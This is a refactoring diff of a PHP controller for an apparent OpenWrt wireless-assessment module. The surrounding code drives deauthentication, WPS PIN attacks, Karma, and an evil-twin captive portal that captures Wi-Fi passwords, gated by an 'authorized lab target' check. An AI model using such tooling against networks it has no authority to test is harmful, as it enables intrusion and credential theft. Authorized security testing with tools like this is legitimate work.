@@ -74,12 +74,12 @@ class Wireless_assessmentController extends \frieren\core\Controller
     {
         return self::setSuccess([
             'system' => $this->getSystemInfo(),
-            'storage' => $this->getStorageInfo(),
+            'storage' => WaSystemInfo::getStorageInfo(),
             'tools' => $this->getToolStatus(),
-            'packages' => $this->getPackageStatus(),
+            'packages' => WaSystemInfo::getPackageStatus(),
             'radios' => $this->getRadios(),
-            'interfaces' => $this->getWirelessInterfaces(),
-            'uciWireless' => $this->redactWirelessConfig(),
+            'interfaces' => WaSystemInfo::getWirelessInterfaces(),
+            'uciWireless' => WaValidators::redactWirelessConfig(),
         ]);
     }
 
@@ -116,7 +116,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
     public function scanStatus()
     {
         $jobId = $this->request['jobId'] ?? '';
-        if (!$this->isSafeJobId($jobId)) {
+        if (!WaValidators::isSafeJobId($jobId)) {
             return self::setError('Invalid scan job.');
         }
 
@@ -151,7 +151,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
             ]);
         }
 
-        $networks = $this->parseIwinfoScan($output);
+        $networks = WaParsers::parseIwinfoScan($output);
         // The job ran two scan passes back-to-back (see createScanJob) to counter
         // single-pass under-reporting, so the same BSSID can appear twice here.
         // Keep one row per BSSID, preferring whichever pass had the stronger signal.
@@ -161,7 +161,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
             if ($b === '') {
                 continue;
             }
-            if (!isset($byBssid[$b]) || $this->signalDbm($net) > $this->signalDbm($byBssid[$b])) {
+            if (!isset($byBssid[$b]) || WaParsers::signalDbm($net) > WaParsers::signalDbm($byBssid[$b])) {
                 $byBssid[$b] = $net;
             }
         }
@@ -175,7 +175,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
             }
         }
         unset($net);
-        $networks = $this->attachVendors($networks, 'bssid');
+        $networks = WaVendorLookup::attachVendors($networks, 'bssid');
 
         return self::setSuccess([
             'pending' => false,
@@ -193,7 +193,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
     public function updateTargetMetadata()
     {
         $bssid = strtolower(trim((string)($this->request['bssid'] ?? '')));
-        if (!$this->isSafeBssid($bssid)) {
+        if (!WaValidators::isSafeBssid($bssid)) {
             return self::setError('Invalid target BSSID.');
         }
 
@@ -236,10 +236,10 @@ class Wireless_assessmentController extends \frieren\core\Controller
         $deauthInterval = (int)($this->request['deauthInterval'] ?? 6);
         $deauthDelay = (int)($this->request['deauthDelay'] ?? 0);
 
-        if (!$this->isSafeBssid($bssid)) {
+        if (!WaValidators::isSafeBssid($bssid)) {
             return self::setError('Invalid target BSSID.');
         }
-        if ($client !== '' && !$this->isSafeBssid($client)) {
+        if ($client !== '' && !WaValidators::isSafeBssid($client)) {
             return self::setError('Invalid client MAC.');
         }
         if ($duration < 15 || $duration > 120) {
@@ -276,10 +276,10 @@ class Wireless_assessmentController extends \frieren\core\Controller
         }
         $target = [
             'bssid' => $bssid,
-            'ssid' => $this->cleanSsid((string)($this->request['ssid'] ?? '')),
+            'ssid' => WaParsers::cleanSsid((string)($this->request['ssid'] ?? '')),
             'security' => trim((string)($this->request['security'] ?? '')),
             'frequency' => '',
-            'metadata' => ['label' => $this->cleanSsid((string)($this->request['ssid'] ?? '')), 'authorized' => true],
+            'metadata' => ['label' => WaParsers::cleanSsid((string)($this->request['ssid'] ?? '')), 'authorized' => true],
         ];
 
         $channel = (int)($this->request['channel'] ?? 0);
@@ -307,7 +307,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
     public function captureStatus()
     {
         $jobId = $this->request['jobId'] ?? '';
-        if (!$this->isSafeJobId($jobId)) {
+        if (!WaValidators::isSafeJobId($jobId)) {
             return self::setError('Invalid capture job.');
         }
 
@@ -334,14 +334,14 @@ class Wireless_assessmentController extends \frieren\core\Controller
             'exitCode' => is_file($paths['done']) ? trim((string)@file_get_contents($paths['done'])) : '',
             'result' => $result,
             'steps' => $this->deriveCaptureSteps($out, $errText, $pending, $deauth, $result),
-            'stopReason' => $pending ? null : $this->captureStopReason($out, $errText, $result),
+            'stopReason' => $pending ? null : WaParsers::captureStopReason($out, $errText, $result),
         ]);
     }
 
     public function stopCapture()
     {
         $jobId = $this->request['jobId'] ?? '';
-        if (!$this->isSafeJobId($jobId)) {
+        if (!WaValidators::isSafeJobId($jobId)) {
             return self::setError('Invalid capture job.');
         }
 
@@ -367,7 +367,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
         if (is_dir($dir)) {
             foreach (glob($dir . '/*.json') as $metaPath) {
                 $jobId = basename($metaPath, '.json');
-                if (!$this->isSafeJobId($jobId)) {
+                if (!WaValidators::isSafeJobId($jobId)) {
                     continue;
                 }
                 $paths = $this->captureJobPaths($jobId);
@@ -394,7 +394,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
     {
         $jobId = $this->request['jobId'] ?? '';
         $kind = $this->request['kind'] ?? 'hash';
-        if (!$this->isSafeJobId($jobId)) {
+        if (!WaValidators::isSafeJobId($jobId)) {
             return self::setError('Invalid capture job.');
         }
 
@@ -410,7 +410,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
     public function deleteCapture()
     {
         $jobId = $this->request['jobId'] ?? '';
-        if (!$this->isSafeJobId($jobId)) {
+        if (!WaValidators::isSafeJobId($jobId)) {
             return self::setError('Invalid capture job.');
         }
 
@@ -473,7 +473,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
     public function wpsScanStatus()
     {
         $jobId = $this->request['jobId'] ?? '';
-        if (!$this->isSafeJobId($jobId)) {
+        if (!WaValidators::isSafeJobId($jobId)) {
             return self::setError('Invalid WPS job.');
         }
 
@@ -493,7 +493,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
         $byBssid = [];
         foreach ($caps as $cap) {
             $capBytes += (int)@filesize($cap);
-            foreach ($this->parseWpsCapture($cap) as $net) {
+            foreach (WaParsers::parseWpsCapture($cap) as $net) {
                 $key = strtolower($net['bssid'] ?? '');
                 if ($key === '') {
                     continue;
@@ -507,7 +507,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
         // strongest Power per BSSID from every CSV and stamp it onto matching APs.
         $signalByBssid = [];
         foreach (glob($this->wpsJobDir() . '/' . $jobId . '*.csv') ?: [] as $csvFile) {
-            $parsed = $this->parseAirodumpCsv(@file_get_contents($csvFile));
+            $parsed = WaParsers::parseAirodumpCsv(@file_get_contents($csvFile));
             foreach ($parsed['aps'] as $ap) {
                 $key = strtolower($ap['bssid'] ?? '');
                 if ($key === '' || $ap['signal'] === '') {
@@ -526,7 +526,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
         }
         unset($net);
 
-        $networks = $this->attachVendors(array_values($byBssid), 'bssid');
+        $networks = WaVendorLookup::attachVendors(array_values($byBssid), 'bssid');
         if (!$pending && !empty($networks)) {
             $this->mergeWpsResults($networks);
         }
@@ -567,7 +567,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
         $pin = preg_replace('/\D/', '', (string)($this->request['pin'] ?? ''));
         $timeout = (int)($this->request['timeout'] ?? 120);
 
-        if (!$this->isSafeBssid($bssid)) {
+        if (!WaValidators::isSafeBssid($bssid)) {
             return self::setError('Invalid target BSSID.');
         }
         if ($timeout < 30 || $timeout > 600) {
@@ -590,8 +590,8 @@ class Wireless_assessmentController extends \frieren\core\Controller
         }
         $target = [
             'bssid' => $bssid,
-            'ssid' => $this->cleanSsid((string)($this->request['ssid'] ?? '')),
-            'metadata' => ['label' => $this->cleanSsid((string)($this->request['ssid'] ?? '')), 'authorized' => true],
+            'ssid' => WaParsers::cleanSsid((string)($this->request['ssid'] ?? '')),
+            'metadata' => ['label' => WaParsers::cleanSsid((string)($this->request['ssid'] ?? '')), 'authorized' => true],
         ];
 
         $channel = (int)($this->request['channel'] ?? 0);
@@ -611,7 +611,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
     public function wpsAttackStatus()
     {
         $jobId = $this->request['jobId'] ?? '';
-        if (!$this->isSafeJobId($jobId)) {
+        if (!WaValidators::isSafeJobId($jobId)) {
             return self::setError('Invalid WPS job.');
         }
 
@@ -625,7 +625,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
         $pending = !is_file($paths['done']);
         $out = $this->tailFile($paths['out'], 8000);
         $errText = trim($this->tailFile($paths['err'], 3000));
-        $result = $this->parseWpsAttackResult($out . "\n" . $errText);
+        $result = WaParsers::parseWpsAttackResult($out . "\n" . $errText);
         $mode = $meta['mode'] ?? 'pixie';
 
         // Live countdown: elapsed from when the job dir was created, versus the
@@ -642,7 +642,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
             'meta' => $meta,
             'result' => $result,
             'steps' => $this->deriveWpsSteps($out, $errText, $pending, $mode, $result),
-            'stopReason' => $pending ? null : $this->wpsStopReason($out, $errText, $result),
+            'stopReason' => $pending ? null : WaParsers::wpsStopReason($out, $errText, $result),
             'log' => $out,
             'error' => $errText,
             'timeoutSec' => $timeoutSec,
@@ -655,7 +655,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
     public function stopWpsAttack()
     {
         $jobId = $this->request['jobId'] ?? '';
-        if (!$this->isSafeJobId($jobId)) {
+        if (!WaValidators::isSafeJobId($jobId)) {
             return self::setError('Invalid WPS job.');
         }
         $paths = $this->wpsJobPaths($jobId);
@@ -673,7 +673,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
         if (is_dir($dir)) {
             foreach (glob($dir . '/*.json') as $metaPath) {
                 $jobId = basename($metaPath, '.json');
-                if (!$this->isSafeJobId($jobId)) {
+                if (!WaValidators::isSafeJobId($jobId)) {
                     continue;
                 }
                 $meta = json_decode((string)@file_get_contents($metaPath), true);
@@ -686,7 +686,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
                     'jobId' => $jobId,
                     'meta' => $meta,
                     'pending' => !is_file($paths['done']),
-                    'result' => $this->parseWpsAttackResult($this->tailFile($paths['out'], 8000)),
+                    'result' => WaParsers::parseWpsAttackResult($this->tailFile($paths['out'], 8000)),
                 ];
             }
         }
@@ -699,7 +699,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
     public function deleteWpsResult()
     {
         $jobId = $this->request['jobId'] ?? '';
-        if (!$this->isSafeJobId($jobId)) {
+        if (!WaValidators::isSafeJobId($jobId)) {
             return self::setError('Invalid WPS job.');
         }
         $paths = $this->wpsJobPaths($jobId);
@@ -755,7 +755,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
     public function beaconHarvestStatus()
     {
         $jobId = $this->request['jobId'] ?? '';
-        if (!$this->isSafeJobId($jobId)) {
+        if (!WaValidators::isSafeJobId($jobId)) {
             return self::setError('Invalid harvest job.');
         }
 
@@ -773,7 +773,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
         $apByBssid = [];
         $clientByMac = [];
         foreach (glob($this->beaconJobDir() . '/' . $jobId . '*.csv') ?: [] as $csvFile) {
-            $one = $this->parseAirodumpCsv((string)@file_get_contents($csvFile));
+            $one = WaParsers::parseAirodumpCsv((string)@file_get_contents($csvFile));
             foreach ($one['aps'] as $ap) {
                 $key = strtolower($ap['bssid'] ?? '');
                 if ($key !== '' && !isset($apByBssid[$key])) {
@@ -787,12 +787,12 @@ class Wireless_assessmentController extends \frieren\core\Controller
                 }
             }
         }
-        $parsed['aps'] = $this->attachVendors(array_values($apByBssid), 'bssid');
-        $parsed['clients'] = $this->attachVendors(array_values($clientByMac), 'mac');
+        $parsed['aps'] = WaVendorLookup::attachVendors(array_values($apByBssid), 'bssid');
+        $parsed['clients'] = WaVendorLookup::attachVendors(array_values($clientByMac), 'mac');
 
         $wps = [];
         foreach (glob($this->beaconJobDir() . '/' . $jobId . '*.cap') ?: [] as $capFile) {
-            foreach ($this->parseWpsCapture($capFile) as $w) {
+            foreach (WaParsers::parseWpsCapture($capFile) as $w) {
                 $wps[$w['bssid']] = $w;
             }
         }
@@ -833,7 +833,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
     public function stopBeaconHarvest()
     {
         $jobId = $this->request['jobId'] ?? '';
-        if (!$this->isSafeJobId($jobId)) {
+        if (!WaValidators::isSafeJobId($jobId)) {
             return self::setError('Invalid harvest job.');
         }
         $paths = $this->beaconJobPaths($jobId);
@@ -857,7 +857,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
         // classic Wi-Fi-password page so existing Evil Portal callers are unchanged.
         $template = (string)($this->request['template'] ?? 'wifi');
         $customHtml = (string)($this->request['customHtml'] ?? '');
-        if (!isset($this->portalTemplateDefs()[$template])) {
+        if (!isset(WaTemplates::portalTemplateDefs()[$template])) {
             return self::setError('Unknown portal template.');
         }
         if ($template === 'custom') {
@@ -869,7 +869,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
             }
         }
 
-        if (!$this->isSafeBssid($bssid)) {
+        if (!WaValidators::isSafeBssid($bssid)) {
             return self::setError('Invalid target BSSID.');
         }
         if ($internet && $band === '5g') {
@@ -902,7 +902,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
         if (empty($this->request['authorized'])) {
             return self::setError('Target must be marked as an authorized lab target before running the Evil Portal.');
         }
-        $ssid = $this->cleanSsid((string)($this->request['ssid'] ?? ''));
+        $ssid = WaParsers::cleanSsid((string)($this->request['ssid'] ?? ''));
         if ($ssid === '' || $ssid === '<hidden>') {
             return self::setError('Target SSID is unknown. Scan the target first so the twin can clone its name.');
         }
@@ -949,7 +949,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
             'clients' => $clients,
             'clientCount' => count($clients),
             'credentials' => $credentials,
-            'verifiedPassword' => $this->firstVerifiedPassword($credentials),
+            'verifiedPassword' => WaParsers::firstVerifiedPassword($credentials),
         ]);
     }
 
@@ -966,7 +966,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
     public function listPortalTemplates()
     {
         $out = [];
-        foreach ($this->portalTemplateDefs() as $id => $def) {
+        foreach (WaTemplates::portalTemplateDefs() as $id => $def) {
             $out[] = [
                 'id' => $id,
                 'label' => $def['label'],
@@ -1035,7 +1035,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
         $clients = [];
         foreach (explode("\n", (string)@file_get_contents($path)) as $line) {
             $parts = preg_split('/\s+/', trim($line));
-            if (count($parts) >= 3 && $this->isSafeBssid(strtolower($parts[1])) && strpos($parts[2], '10.0.1.') === 0) {
+            if (count($parts) >= 3 && WaValidators::isSafeBssid(strtolower($parts[1])) && strpos($parts[2], '10.0.1.') === 0) {
                 $clients[] = [
                     'mac' => strtolower($parts[1]),
                     'ip' => $parts[2],
@@ -1048,7 +1048,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
 
     public function startKarma()
     {
-        $ssid = $this->cleanSsid((string)($this->request['ssid'] ?? ''));
+        $ssid = WaParsers::cleanSsid((string)($this->request['ssid'] ?? ''));
         $channel = (int)($this->request['channel'] ?? 6);
 
         if ($ssid === '' || $ssid === '<hidden>') {
@@ -1094,7 +1094,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
         @unlink($rt . '/setup.err');
         @unlink($rt . '/seen.json');
 
-        $safeSsid = $this->sanitizeSsidForConf($ssid);
+        $safeSsid = WaValidators::sanitizeSsidForConf($ssid);
         $iface = 'wkarma0';
         $ch = (int)$channel;
         $ePhy = escapeshellarg($monitor['phy']);
@@ -1236,7 +1236,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
             }
             $joined[] = $row;
         }
-        $joined = $this->attachVendors($joined, 'mac');
+        $joined = WaVendorLookup::attachVendors($joined, 'mac');
 
         return self::setSuccess([
             'running' => $alive,
@@ -1406,7 +1406,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
         // Live uplink association: a managed (client) iface reporting an SSID means
         // the STA is actually joined to the upstream AP.
         $connected = false;
-        foreach ($this->getWirelessInterfaces() as $iface) {
+        foreach (WaSystemInfo::getWirelessInterfaces() as $iface) {
             if (($iface['type'] ?? '') === 'managed' && !empty($iface['ssid'])) {
                 $connected = true;
                 break;
@@ -1463,7 +1463,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
         @file_put_contents($paths['meta'], json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
 
         $nmap = trim((string)shell_exec('command -v nmap 2>/dev/null')) ?: 'nmap';
-        $args = $this->nmapProfileArgs($profile);
+        $args = WaSystemInfo::nmapProfileArgs($profile);
         $eCidr = escapeshellarg($resolved['cidr']);
         $eOut = escapeshellarg($paths['out']);
         $eErr = escapeshellarg($paths['err']);
@@ -1484,7 +1484,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
     public function lanScanStatus()
     {
         $jobId = $this->request['jobId'] ?? '';
-        if (!$this->isSafeJobId($jobId)) {
+        if (!WaValidators::isSafeJobId($jobId)) {
             return self::setError('Invalid scan job.');
         }
         $paths = $this->lanJobPaths($jobId);
@@ -1521,7 +1521,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
     public function stopLanScan()
     {
         $jobId = $this->request['jobId'] ?? '';
-        if (!$this->isSafeJobId($jobId)) {
+        if (!WaValidators::isSafeJobId($jobId)) {
             return self::setError('Invalid scan job.');
         }
         $paths = $this->lanJobPaths($jobId);
@@ -1552,34 +1552,6 @@ class Wireless_assessmentController extends \frieren\core\Controller
     private function isLanScanRunning()
     {
         return trim((string)shell_exec('/usr/bin/pgrep -x nmap 2>/dev/null')) !== '';
-    }
-
-    private function nmapProfileArgs($profile)
-    {
-        switch ($profile) {
-            case 'ports':
-                return '-n -Pn --top-ports 100 -T4 --max-retries 1 --host-timeout 60s';
-            case 'services':
-                return '-n -Pn --top-ports 50 -sV --version-light -T4 --max-retries 1 --host-timeout 90s';
-            case 'discovery':
-            default:
-                return '-sn -n -T4';
-        }
-    }
-
-    private function isPrivateIpv4($ip)
-    {
-        // Plain octet math (no large hex literals / bitwise) so this is safe on the
-        // router's 32-bit PHP build where 0xFFFFFFFF is a float.
-        $o = explode('.', $ip);
-        if (count($o) !== 4) {
-            return false;
-        }
-        $a = (int)$o[0];
-        $b = (int)$o[1];
-        return ($a === 10)                        // 10.0.0.0/8
-            || ($a === 172 && $b >= 16 && $b <= 31) // 172.16.0.0/12
-            || ($a === 192 && $b === 168);          // 192.168.0.0/16
     }
 
     // Turn a target request into a validated CIDR. Accepts the keywords "uplink"
@@ -1626,7 +1598,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
             if (!$octetsOk || $prefix > 32) {
                 return ['error' => 'Invalid target address.'];
             }
-            if (!$this->isPrivateIpv4($ip)) {
+            if (!WaValidators::isPrivateIpv4($ip)) {
                 return ['error' => 'Only private (RFC1918) networks you are attached to can be scanned.'];
             }
             $cidr = $ip . '/' . $prefix;
@@ -1685,33 +1657,10 @@ class Wireless_assessmentController extends \frieren\core\Controller
             }
         }
         // Fill vendor from our OUI DB where nmap didn't provide one.
-        return $this->attachVendorsFallback($hosts);
+        return WaVendorLookup::attachVendorsFallback($hosts);
     }
 
     // Like attachVendors but keeps any vendor nmap already resolved.
-    private function attachVendorsFallback($hosts)
-    {
-        if (empty($hosts)) {
-            return $hosts;
-        }
-        $macs = [];
-        foreach ($hosts as $h) {
-            if (!empty($h['mac']) && empty($h['vendor'])) {
-                $macs[] = $h['mac'];
-            }
-        }
-        if (empty($macs)) {
-            return $hosts;
-        }
-        $map = $this->ouiVendorMap($macs);
-        foreach ($hosts as &$h) {
-            if (!empty($h['mac']) && empty($h['vendor'])) {
-                $h['vendor'] = $map[$this->macOui($h['mac'])] ?? '';
-            }
-        }
-        unset($h);
-        return $hosts;
-    }
 
     private function getSystemInfo()
     {
@@ -1719,48 +1668,8 @@ class Wireless_assessmentController extends \frieren\core\Controller
             'hostname' => trim(@file_get_contents('/proc/sys/kernel/hostname')),
             'model' => trim(@file_get_contents('/tmp/sysinfo/model')),
             'board' => trim(@file_get_contents('/tmp/sysinfo/board_name')),
-            'release' => $this->readOpenWrtRelease(),
+            'release' => WaSystemInfo::readOpenWrtRelease(),
         ];
-    }
-
-    private function readOpenWrtRelease()
-    {
-        $release = [];
-        $lines = @file('/etc/openwrt_release', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-        if (!is_array($lines)) {
-            return $release;
-        }
-        foreach ($lines as $line) {
-            if (strpos($line, '=') === false) {
-                continue;
-            }
-            [$key, $value] = explode('=', $line, 2);
-            $release[$key] = trim($value, "'");
-        }
-        return $release;
-    }
-
-    private function getStorageInfo()
-    {
-        $rows = [];
-        $output = shell_exec('/bin/df -h 2>/dev/null');
-        foreach (explode("\n", trim((string)$output)) as $index => $line) {
-            if ($index === 0 || trim($line) === '') {
-                continue;
-            }
-            $parts = preg_split('/\s+/', trim($line));
-            if (count($parts) >= 6) {
-                $rows[] = [
-                    'filesystem' => $parts[0],
-                    'size' => $parts[1],
-                    'used' => $parts[2],
-                    'available' => $parts[3],
-                    'usePercent' => $parts[4],
-                    'mountedOn' => $parts[5],
-                ];
-            }
-        }
-        return $rows;
     }
 
     private function getToolStatus()
@@ -1772,54 +1681,10 @@ class Wireless_assessmentController extends \frieren\core\Controller
                 'name' => $tool,
                 'installed' => $path !== '',
                 'path' => $path,
-                'requiredFor' => $this->toolPurpose($tool),
+                'requiredFor' => WaTemplates::toolPurpose($tool),
             ];
         }
         return $tools;
-    }
-
-    private function toolPurpose($tool)
-    {
-        $purposes = [
-            'iw' => 'radio and AP scanning',
-            'iwinfo' => 'OpenWrt wireless status',
-            'wifi' => 'OpenWrt wireless control/status',
-            'ubus' => 'OpenWrt runtime data',
-            'uci' => 'configuration reads',
-            'hcxdumptool' => 'unused — active injection crashed this hardware, retired from all attack paths',
-            'nmap' => 'LAN/client service checks',
-            'curl' => 'module integrations',
-            'tcpdump' => 'packet capture workflows',
-            'aircrack-ng' => 'handshake verification/cracking workflow',
-            'airodump-ng' => 'monitor-mode capture engine (PMKID/handshake)',
-            'aireplay-ng' => 'authorized deauth to force handshakes',
-            'reaver' => 'WPS assessment',
-            'wash' => 'WPS discovery',
-            'bully' => 'alternate WPS assessment',
-            'hcxpcapngtool' => 'capture -> hashcat 22000 conversion',
-            'hcxhashtool' => 'hash utility workflows',
-            'sqlite3' => 'CLI database inspection',
-            'hostapd' => 'Evil Portal twin AP',
-            'dnsmasq' => 'Evil Portal DHCP for twin subnet',
-            'nft' => 'Evil Portal captive-portal redirect',
-            'uhttpd' => 'Evil Portal captive-portal web server',
-        ];
-        return $purposes[$tool] ?? '';
-    }
-
-    private function getPackageStatus()
-    {
-        $wanted = ['aircrack-ng', 'hcxtools', 'reaver', 'tcpdump', 'tcpdump-mini', 'sqlite3-cli', 'git', 'php8-cli'];
-        $installedRaw = (string)shell_exec('/bin/opkg list-installed 2>/dev/null');
-        $packages = [];
-        foreach ($wanted as $pkg) {
-            $packages[] = [
-                'name' => $pkg,
-                'installed' => strpos($installedRaw, $pkg . ' -') !== false,
-                'available' => true,
-            ];
-        }
-        return $packages;
     }
 
     private function getRadios()
@@ -1832,177 +1697,23 @@ class Wireless_assessmentController extends \frieren\core\Controller
         $phyText = (string)shell_exec('/usr/sbin/iw phy 2>/dev/null');
         foreach ($paths as $path) {
             $name = basename($path);
-            $chunk = $this->extractPhyChunk($phyText, $name);
+            $chunk = WaSystemInfo::extractPhyChunk($phyText, $name);
             $radios[] = [
                 'name' => $name,
-                'bands' => $this->detectBands($chunk),
-                'modes' => $this->detectModes($chunk),
+                'bands' => WaSystemInfo::detectBands($chunk),
+                'modes' => WaSystemInfo::detectModes($chunk),
                 'path' => @readlink($path) ?: '',
             ];
         }
         return $radios;
     }
 
-    private function extractPhyChunk($text, $phy)
-    {
-        if (!preg_match('/Wiphy\s+' . preg_quote($phy, '/') . '\b(.*?)(?=\nWiphy\s+phy|\z)/s', $text, $match)) {
-            return '';
-        }
-        return $match[1];
-    }
-
-    private function detectBands($chunk)
-    {
-        $bands = [];
-        if (strpos($chunk, '2412.0 MHz') !== false) {
-            $bands[] = '2.4 GHz';
-        }
-        if (strpos($chunk, '5180.0 MHz') !== false || strpos($chunk, '5745.0 MHz') !== false) {
-            $bands[] = '5 GHz';
-        }
-        return $bands;
-    }
-
-    private function detectModes($chunk)
-    {
-        $modes = [];
-        foreach (['managed', 'AP', 'monitor', 'mesh point'] as $mode) {
-            if (preg_match('/\*\s+' . preg_quote($mode, '/') . '\b/', $chunk)) {
-                $modes[] = $mode;
-            }
-        }
-        return $modes;
-    }
-
-    private function getWirelessInterfaces()
-    {
-        $interfaces = [];
-        $output = (string)shell_exec('/usr/sbin/iw dev 2>/dev/null');
-        $currentPhy = '';
-        $current = null;
-        foreach (explode("\n", $output) as $line) {
-            if (preg_match('/^phy#(\d+)/', trim($line), $match)) {
-                $currentPhy = 'phy' . $match[1];
-                continue;
-            }
-            if (preg_match('/^\s*Interface\s+(\S+)/', $line, $match)) {
-                if ($current !== null) {
-                    $interfaces[] = $current;
-                }
-                $current = [
-                    'name' => $match[1],
-                    'phy' => $currentPhy,
-                    'type' => '',
-                    'ssid' => '',
-                    'channel' => '',
-                    'frequency' => '',
-                    'txpower' => '',
-                ];
-                continue;
-            }
-            if ($current === null) {
-                continue;
-            }
-            if (preg_match('/^\s*ssid\s+(.+)$/', $line, $match)) {
-                $current['ssid'] = trim($match[1]);
-            } elseif (preg_match('/^\s*type\s+(.+)$/', $line, $match)) {
-                $current['type'] = trim($match[1]);
-            } elseif (preg_match('/^\s*channel\s+(\d+)\s+\(([^)]+)\)/', $line, $match)) {
-                $current['channel'] = $match[1];
-                $current['frequency'] = $match[2];
-            } elseif (preg_match('/^\s*txpower\s+(.+)$/', $line, $match)) {
-                $current['txpower'] = trim($match[1]);
-            }
-        }
-        if ($current !== null) {
-            $interfaces[] = $current;
-        }
-        return $interfaces;
-    }
-
-    private function redactWirelessConfig()
-    {
-        $output = (string)shell_exec('/sbin/uci show wireless 2>/dev/null');
-        $output = preg_replace('/\.(key|password|sae_password)=.*/', '.$1=<redacted>', $output);
-        return trim($output);
-    }
-
-    private function isSafeInterfaceName($name)
-    {
-        return is_string($name) && preg_match('/^[A-Za-z0-9_.:-]{1,32}$/', $name);
-    }
-
-    private function isSafeJobId($jobId)
-    {
-        return is_string($jobId) && preg_match('/^[A-Za-z0-9_.-]{1,64}$/', $jobId);
-    }
-
-    private function isSafeBssid($bssid)
-    {
-        return is_string($bssid) && preg_match('/^[0-9a-f]{2}(:[0-9a-f]{2}){5}$/', $bssid);
-    }
-
     // First 3 octets of a MAC as an uppercase 6-hex OUI (e.g. "6c:c2:42:.." -> "6CC242").
-    private function macOui($mac)
-    {
-        return strtoupper(str_replace([':', '-'], '', substr((string)$mac, 0, 8)));
-    }
 
     // Resolve manufacturer names for a set of MACs using nmap's OUI database in a
     // single pass over the file (1.2MB), so enriching a whole scan stays cheap.
-    private function ouiVendorMap(array $macs)
-    {
-        $wanted = [];
-        foreach ($macs as $mac) {
-            $oui = $this->macOui($mac);
-            if (strlen($oui) === 6) {
-                $wanted[$oui] = '';
-            }
-        }
-        if (empty($wanted)) {
-            return [];
-        }
-        $file = '/usr/share/nmap/nmap-mac-prefixes';
-        $fh = @fopen($file, 'r');
-        if (!$fh) {
-            return $wanted;
-        }
-        $remaining = count($wanted);
-        while ($remaining > 0 && ($line = fgets($fh)) !== false) {
-            if ($line === '' || $line[0] === '#') {
-                continue;
-            }
-            $prefix = strtoupper(substr($line, 0, 6));
-            if (isset($wanted[$prefix]) && $wanted[$prefix] === '') {
-                $wanted[$prefix] = trim(substr($line, 7));
-                $remaining--;
-            }
-        }
-        fclose($fh);
-        return $wanted;
-    }
 
     // Attach a 'vendor' field to each row keyed by $macKey (bssid/mac).
-    private function attachVendors($rows, $macKey = 'bssid')
-    {
-        if (!is_array($rows) || empty($rows)) {
-            return $rows;
-        }
-        $macs = [];
-        foreach ($rows as $row) {
-            if (is_array($row) && isset($row[$macKey])) {
-                $macs[] = $row[$macKey];
-            }
-        }
-        $map = $this->ouiVendorMap($macs);
-        foreach ($rows as &$row) {
-            if (is_array($row) && isset($row[$macKey])) {
-                $row['vendor'] = $map[$this->macOui($row[$macKey])] ?? '';
-            }
-        }
-        unset($row);
-        return $rows;
-    }
 
     private function storageRoot()
     {
@@ -2022,16 +1733,6 @@ class Wireless_assessmentController extends \frieren\core\Controller
     private function reconDbPath()
     {
         return $this->storageDir() . '/recon.json';
-    }
-
-    private function defaultReconDatabase()
-    {
-        return [
-            'updatedAt' => '',
-            'scans' => [],
-            'targets' => [],
-            'clients' => [],
-        ];
     }
 
     private function ensureDir($dir)
@@ -2083,7 +1784,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
         // name so a simultaneous 2.4 + 5 GHz scan doesn't collide.
         $scanIface = ($band === '5g') ? 'wascan5' : 'wascan2';
         $temp = true;
-        if (!$this->isSafeInterfaceName($scanIface)) {
+        if (!WaValidators::isSafeInterfaceName($scanIface)) {
             return ['error' => 'Could not resolve a scan interface.'];
         }
 
@@ -2164,31 +1865,9 @@ class Wireless_assessmentController extends \frieren\core\Controller
         ];
     }
 
-    private function isSafePhy($phy)
-    {
-        return is_string($phy) && preg_match('/^phy\d+$/', $phy);
-    }
-
-    private function isSafeRadio($radio)
-    {
-        return is_string($radio) && preg_match('/^radio\d+$/', $radio);
-    }
-
     private function isCaptureRunning()
     {
         return trim((string)shell_exec('/usr/bin/pgrep -x airodump-ng 2>/dev/null')) !== '';
-    }
-
-    private function uciRadioMap()
-    {
-        $radios = [];
-        $output = (string)shell_exec('/sbin/uci show wireless 2>/dev/null');
-        foreach (explode("\n", $output) as $line) {
-            if (preg_match("/^wireless\.(radio\d+)\.(band|path|disabled)='?([^']*)'?/", trim($line), $m)) {
-                $radios[$m[1]][$m[2]] = $m[3];
-            }
-        }
-        return $radios;
     }
 
     private function resolveMonitorTarget($channel)
@@ -2196,7 +1875,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
